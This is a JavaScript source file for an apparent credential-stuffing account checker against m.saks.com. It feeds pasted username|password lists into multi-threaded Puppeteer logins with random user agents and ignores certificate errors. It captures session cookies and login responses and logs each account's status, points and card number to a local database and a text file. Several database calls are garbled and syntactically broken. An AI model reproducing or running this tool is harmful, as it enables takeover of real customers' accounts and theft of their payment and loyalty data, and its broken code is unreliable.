const puppeteer = require('puppeteer');
const sarkHelper = require('../helper/sark/sarkHelper');
const utilsHelper = require('../helper/utils');
const process = require('process');
const randomUserAgent = require('random-user-agent');
const os = require('os');
const fs = require('fs');
process.setMaxListeners(0)

const Datastore = require('nedb')
const checkLoginDB = new Datastore({
    filename: 'database/checkLoginSark.db',
    autoload: true
});

const autoSave = () => {

    checkLoginDB.find{}, err, docs =>{.find({}, (err, docs) =>{
        "_id": 0,
        "success": 0,
        "resLogin": 0,
    }).sort({
        status: -1
    }).exec(function (err, docs) {
        let output = '';
        docs.forEach(element => {
            output += Object.values(element).join('|') + "\n";
        });

        let stream = fs.createWriteStream("sharkLogin.txt");

        stream.once('open', function (fd) {
            stream.write(output);
            stream.end();
        });
    })
}
autoSave()
setInterval(autoSave, 10000);

const browserSark = async (dataLogin, showBrowser = false) => {

    let cookiesLogin = [];
    let loginResult = {};
    let userAgent = randomUserAgent();

    let args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-infobars',
        '--window-position=0,0',
        '--ignore-certifcate-errors',
        '--ignore-certifcate-errors-spki-list',
        `--user-agent="${userAgent}"`,
        '--start-maximized',
        '--disable-background-networking',
        '--hide-scrollbars',
        '--mute-audio',
        '--disable-gpu',
    ];

    let modePuppeteer = {
        headless: showBrowser,
        ignoreHTTPSErrors: true,
        executablePath: utilsHelper.getChromiumExecPath(),
        args: args
    };
    let blockAllowLoad = ['script', 'xhr', 'document'];
    let browser = await puppeteer.launch(modePuppeteer);
    let page = (await browser.pages())[0];


    await page.setUserAgent(userAgent);

    await page.setViewport({
        width: 1368,
        height: 720
    });

    await page.setExtraHTTPHeaders({
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'
    });

    if (showBrowser) {
        await page.setRequestInterception(true);

        page.on('request', (req) => {
            if (blockAllowLoad.includes(req.resourceType())) {
                req.continue();
            } else {
                req.abort();
            }
        });
    }

    page.on('response', (res) => {
        let dataRequest = res.request().method();
        if (res.url() == "https://m.saks.com/v1/account-service/accounts/sign-in" && dataRequest == "POST") {
            res.text().then(result => {
                //console.log(result)
                if (utilsHelper.IsJsonString(result))
                    loginResult = JSON.parse(result)
            }).catch(result => {
                //console.log(result)
                if (utilsHelper.IsJsonString(result))
                    loginResult = JSON.parse(result)
            })
        }

    });

    /*
    await page.goto("https://m.saks.com/eSearch.jsp?N=306622829&PA=TRUE").catch(() => {});

    await page.waitForSelector('.product', {
        timeout: 10000
    }).catch(() => {});
    await page.click(".product");

    await page.waitForSelector('.add-to-bag', {
        timeout: 10000
    }).catch(() => {});
    await page.click(".add-to-bag");

    await page.goto("https://m.saks.com/checkout/SaksBag.jsp").catch(() => {});

    await page.waitForSelector('div.shopping-bag__btn > a', {
        timeout: 10000
    }).catch(() => {});
    await page.click("div.shopping-bag__btn > a");

    */
    
    await page.goto("https://m.saks.com/account/login").catch(() => {});

    await page.waitForSelector('.sign-into-account__button > button', {
        timeout: 10000
    }).catch(() => {});

    await page.waitFor(2000);

    if (await page.$(".sign-into-account__submit-button") !== null) {

        
        // await page.evaluate((dataLogin) => {
        //     document.querySelector("#sign-into-account-email-field").value = dataLogin.username
        //     document.querySelector("#sign-into-account-password-field").value = dataLogin.password
        //     document.querySelector(".sign-into-account__submit-button").click()
        // }, dataLogin);
        

        await page.click("#sign-into-account-email-field");
        await page.keyboard.type(dataLogin.username);
        await page.waitFor(500);
        await page.click("#sign-into-account-password-field");
        await page.keyboard.type(dataLogin.password);
        await page.waitFor(500);
        await page.click(".sign-into-account__submit-button");
    }
    await page.waitFor(5000);

    if (!Object.keys(loginResult).length || await page.$(".sign-into-account__submit-button") !== null) {
        await page.waitFor(3000);
    }


    cookiesLogin = await page.cookies();

    await page.removeAllListeners()
    await page.close();
    while (!(await page.isClosed())) {
        await page.close();
    }

    await browser.close();

    return {
        cookiesLogin,
        userAgent,
        loginResult
    };

}


window.onload = () => {

    checkLoginDB.find{}, err, docs =>{.find({}, {
        "_id": 0,
        "success": 0,
        "resLogin": 0,
    }).sort({
        status: -1
    }).exec(function (err, docs) {
        let listOuputRestore = '#listOuputRestore';
        docs.forEach(element => {
            $(listOuputRestore).append(Object.values(element).join('|') + "\n");
        });
    })


    document.querySelector('#btnStart').addEventListener('click', async () => {
        $(proccessingCurrent).text(0);

        let buttonElement = '#btnStart';
        let buttonDefaultText = $(buttonElement).text();

        $(buttonElement).html('<i class="fa fa-spinner fa-spin" style="font-size:20px"></i> Proccessing..');
        $(buttonElement).prop("disabled", true);

        let elementOutput = "#listOuput";
        let elementproccessingAll = "#proccessingAll";
        let elementproccessingCurrent = "#proccessingCurrent";



        let theard = Number($("#theardCount").val())

        let showBrowser = $('#checkboxShowBrowser').is(":checked");
        if (showBrowser) showBrowser = false
        else showBrowser = true

        let listInput = $("#listInputMain").val().trim().replace(/^\s*\n/gm, "").split('\n');

        $(elementOutput).text('');
        $(elementproccessingCurrent).text(0);
        $(elementproccessingAll).text(listInput.length);


        let accountCount = 0;

        for (let index = 0; index < listInput.length / (theard * 1); index++) {

            let promiseLoginAll = []

            for (let i = 1; i <= theard; i++) {

                let actionAfterCheck = (result) => {

                    $(elementOutput).append(Object.values({
                        status: result.status,
                        username: result.username,
                        password: result.password,
                        point: result.point,
                        cardNumber: result.cardNumber,
                    }).join('|') + "\n");

                    if (result.success != -1)
                        checkLoginDB.find{}, err, docs =>{.insert(result);

                    $(proccessingCurrent).text(Number($(elementproccessingCurrent).text()) + 1);

                }

                let dataLogin1, dataLogin2
                let dataLoginSaved1, dataLoginSaved2

                if (listInput[accountCount]) {
                    let dataLoginExtract1 = listInput[accountCount].split("|");
                    dataLogin1 = {
                        username: dataLoginExtract1[0].trim(),
                        password: dataLoginExtract1[1].trim(),
                    }

                    let dataLoginSaved1 = await new Promise((resolve, reject) => {
                        checkLoginDB.find{}, err, docs =>{.find({
                            username: dataLogin1.username
                        }, {
                            "_id": 0
                        }, (err, doc) => {
                            resolve(doc)
                        });
                    });

                    if (await dataLoginSaved1[0]) {
                        actionAfterCheck(dataLoginSaved1[0]);
                        dataLogin1 = null
                    }

                    accountCount++
                }

                /*
                if (listInput[accountCount]) {
                    let dataLoginExtract2 = listInput[accountCount].split("|");
                    dataLogin2 = {
                        username: dataLoginExtract2[0].trim(),
                        password: dataLoginExtract2[1].trim(),
                    }

                    let dataLoginSaved2 = await new Promise((resolve, reject) => {
                        checkLoginDB.find{}, err, docs =>{.find({
                            username: dataLogin2.username
                        }, {
                            "_id": 0
                        }, (err, doc) => {
                            resolve(doc)
                        });
                    });

                    if (await dataLoginSaved2[0]) {
                        actionAfterCheck(dataLoginSaved2[0]);
                        dataLogin2 = null
                    }

                    accountCount++
                }
                */

                if (dataLogin1 || dataLogin2) {
                    let promiseLogin = browserSark(dataLogin1, showBrowser).then(dataBrowser => {
                        let cookiesLogin = dataBrowser.cookiesLogin
                        let userAgent = dataBrowser.userAgent;
                        let loginResult = dataBrowser.loginResult;


                        if (dataLogin1) {
                            sarkHelper.checkLogin(dataLogin1, cookiesLogin, loginResult, userAgent).then(result => {
                                actionAfterCheck(result);
                            });
                        }

                        /*
                        if (dataLogin2) {
                            sarkHelper.checkLogin(dataLogin2, cookiesLogin, userAgent).then(result => {
                                actionAfterCheck(result)
                            });
                        }
                        */
                    });

                    promiseLoginAll.push(promiseLogin);
                }

            }

            await Promise.all(promiseLoginAll);

        }

        $(buttonElement).removeAttr('disabled');
        $(buttonElement).hide().text(buttonDefaultText).fadeIn();

    })
};